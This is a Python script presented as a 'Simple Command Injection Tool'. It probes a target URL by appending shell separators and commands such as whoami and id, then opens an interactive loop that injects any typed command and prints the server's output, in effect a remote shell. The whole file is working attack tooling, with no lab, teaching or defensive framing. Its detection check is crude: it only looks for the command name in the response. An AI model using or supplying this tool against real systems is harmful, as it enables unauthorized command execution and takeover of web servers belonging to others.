#!/usr/bin/env python3

import requests
import argparse

class CommandInjectionTool:
    def __init__(self, url):
        self.url = url.rstrip('?&')
        self.detected = False
        self.os_type = None
        self.test_commands = ['whoami', 'uname -a', 'id']
        self.payload_patterns = [';{}', '&&{}', '|{}']
    
    def detect_vulnerability(self):
        print("[*] Checking for Command Injection vulnerability...")
        for pattern in self.payload_patterns:
            for cmd in self.test_commands:
                payload = pattern.format(cmd)
                target = self.url + payload
                try:
                    resp = requests.get(target, timeout=5)
                    if cmd in resp.text:
                        print(f"[+] Vulnerable! Payload succeeded: {payload}")
                        self.detected = True
                        # simple OS guess
                        self.os_type = "Linux" if "Linux" in resp.text else "Windows"
                        return True
                except requests.RequestException:
                    pass
        print("[-] Target does not appear vulnerable.")
        return False

    def interactive_shell(self):
        if not self.detected:
            print("[-] No vulnerability detected. Exiting.")
            return
        print(f"[+] Interactive shell on {self.os_type}. Type 'exit' to quit.")
        while True:
            cmd = input("> ").strip()
            if cmd.lower() in ('exit', 'quit'):
                break
            for pattern in self.payload_patterns:
                payload = pattern.format(cmd)
                target = self.url + payload
                try:
                    resp = requests.get(target, timeout=5)
                    print(resp.text)
                except requests.RequestException as e:
                    print(f"Error: {e}")
                break

def main():
    parser = argparse.ArgumentParser(description="Simple Command Injection Tool")
    parser.add_argument('--url', required=True,
                        help="Target URL (e.g. http://example.com/page.php?id=1)")
    args = parser.parse_args()

    tool = CommandInjectionTool(args.url)
    if tool.detect_vulnerability():
        tool.interactive_shell()

if __name__ == '__main__':
    main()
